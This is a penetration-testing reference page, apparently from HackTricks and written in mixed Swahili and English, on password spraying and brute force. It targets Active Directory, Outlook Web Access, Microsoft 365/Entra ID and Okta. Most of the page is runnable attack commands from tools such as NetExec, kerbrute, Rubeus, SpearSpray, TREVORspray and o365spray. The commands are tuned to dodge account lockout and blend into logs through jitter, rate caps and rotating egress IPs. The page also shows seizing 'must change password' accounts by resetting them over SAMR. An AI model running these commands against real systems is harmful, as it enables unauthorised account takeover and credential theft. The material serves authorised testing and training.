# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Baada ya kupata **valid usernames** kadhaa unaweza kujaribu **common passwords** zaidi (kumbuka password policy ya mazingira) kwa kila mtumiaji uliyegundua.\
Kwa **default** **minimum** ya **password** **length** ni **7**.

Orodha za common usernames pia zinaweza kuwa muhimu: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Kumbuka kuwa **unaweza ku-lockout baadhi ya accounts ukijaribu passwords mbovu kadhaa** (kwa default zaidi ya 10).

### Get password policy

Ikiwa una baadhi ya user credentials au shell kama domain user unaweza **kupata password policy kwa**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Utekelezaji kutoka Linux (au zote)

- Kutumia **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Kutumia **NetExec (CME successor)** kwa targeted, low-noise spraying kupitia SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Kutumia [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(unaweza kuonyesha idadi ya majaribio ili kuepuka lockouts):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - HAIPENDEKEZWI WAKATI MWINGINE HAIFANYI KAZI
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Kwa kutumia `scanner/smb/smb_login` module ya **Metasploit**:

![](<../../images/image (745).png>)

- Kwa kutumia **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Kutoka Windows

- With [Rubeus](https://github.com/Zer1t0/Rubeus) version with brute module:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Kwa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuzalisha watumiaji kutoka kwenye domain kwa chaguo-msingi na itapata sera ya nenosiri kutoka kwenye domain na kupunguza majaribio kulingana nayo):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Ukiwa na [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Tambua na Chukua Udhibiti wa Akaunti za "Password must change at next logon" (SAMR)

Mbinu ya chini ya kelele ni kupulizia benign/empty password na kushika akaunti zinazorejesha STATUS_PASSWORD_MUST_CHANGE, ambayo inaonyesha kuwa password ilimalizwa kwa lazima na inaweza kubadilishwa bila kujua ya zamani.

Workflow:
- Enumerate users (RID brute via SAMR) ili kujenga orodha ya target:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Fanya password tupu na endelea kwenye hits ili kunasa accounts ambazo lazima zibadilishe katika next logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Kwa kila hit, badilisha password kupitia SAMR kwa kutumia module ya NetExec (old password haihitajiki wakati "must change" imewekwa):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Maelezo ya uendeshaji:
- Hakikisha saa ya host yako inalingana na DC kabla ya operesheni zinazotumia Kerberos: `sudo ntpdate <dc_fqdn>`.
- [ + ] bila (Pwn3d!) katika baadhi ya modules (kwa mfano, RDP/WinRM) ina maana creds ni sahihi lakini account haina interactive logon rights.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying hupunguza kelele ikilinganishwa na majaribio ya SMB/NTLM/LDAP bind na inaendana vizuri zaidi na sera za AD lockout. SpearSpray huunganisha LDAP-driven targeting, pattern engine, na awareness ya policy (domain policy + PSOs + badPwdCount buffer) ili kufanya spray kwa usahihi na kwa usalama. Pia inaweza ku-tag principals zilizoathiriwa katika Neo4j kwa BloodHound pathing.

Mawazo ya msingi:
- Kugundua users kupitia LDAP kwa paging na msaada wa LDAPS, kwa hiari ukitumia custom LDAP filters.
- Domain lockout policy + PSO-aware filtering ili kuacha attempt buffer inayoweza kusanidiwa (threshold) na kuepuka kufunga users.
- Uthibitishaji wa Kerberos pre-auth kwa kutumia fast gssapi bindings (hu-generates 4768/4771 kwenye DCs badala ya 4625).
- Password generation ya pattern-based, kwa kila user, kwa kutumia variables kama names na temporal values zinazotokana na pwdLastSet ya kila user.
- Udhibiti wa throughput kwa threads, jitter, na max requests per second.
- Neo4j integration ya hiari ili ku-mark owned users kwa BloodHound.

Matumizi ya msingi na ugunduzi:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Kulenga na udhibiti wa muundo:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Vidhibiti vya siri na usalama:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Uboreshaji wa Neo4j/BloodHound:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Muhtasari wa mfumo wa Pattern (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Tip: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

There are multiples tools for p**assword spraying outlook**.

- With [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- with [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- With [Ruler](https://github.com/sensepost/ruler) (reliable!)
- With [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- With [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

To use any of these tools, you need a user list and a password / a small list of passwords to spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Kwa cloud spraying, kwanza tambua kama tenant ni **managed**, **federated**, au **hybrid**, kwa sababu endpoint na lockout behavior zinaweza kutofautiana na on-prem AD. Katika Microsoft Entra, **Smart Lockout** hubadilisha jinsi guesses za kurudia zinavyotumia lockout budget:

- Kurudia **neno la siri baya lilelile** hakuiendelezi counter ya lockout, lakini kujaribu **candidates mpya** hufanya hivyo.
- **Familiar** na **unfamiliar** locations zina **counters tofauti**.
- Tenants zinazotumia **pass-through authentication (PTA)** hazinufaiki na bad-password hash tracking, kwa hiyo zishughulikie zaidi kama classic lockout-sensitive targets.

Kwa vitendo, spray **neno moja la siri kwa kila round**, acha nafasi ya kutosha kati ya rounds, na pendelea tooling inayoweza kugundua actual auth flow ya tenant kabla ya kutuma guesses.

- Kwa [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray), unaweza recon tenant, kugundua `token_endpoint`, kufanya spray ya `msol`/`adfs`/`owa`/`okta`, na kuzungusha traffic kupitia multiple egress IPs:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- Kwa [**Spray365**](https://github.com/MarkoH17/Spray365), unaweza kuunda mapema **execution plan** inayoweza kuendelea tena, kubadilisha mpangilio wa auth kwa nasibu, na kuweka **minimum delay per user** ili kubaki nje ya lockout window:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- With [**o365spray**](https://github.com/0xZDH/o365spray), unaweza kuthibitisha tenant, kuorodhesha users kwa kutumia modules kama `onedrive`, na kufanya spray kupitia `oauth2` au `adfs` huku ukidumisha **jaribio moja kwa kila user** kwa kila lockout window. Ikiwa tayari una FireProx API, ipitishe kwa `--proxy-url` ili kusambaza source IPs:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Mbinu za hivi karibuni za operator pia zimehamia kuelekea **distributed cloud spraying**. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration) inasaidia time windows, password shuffling, ADFS/M365 spraying, na automatic post-auth exfiltration. Matumizi mabaya ya hivi karibuni duniani halisi pia yalitumia **Microsoft Teams API** account enumeration na **AWS region rotation** ili kusambaza spray waves katika source geographies vingi.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
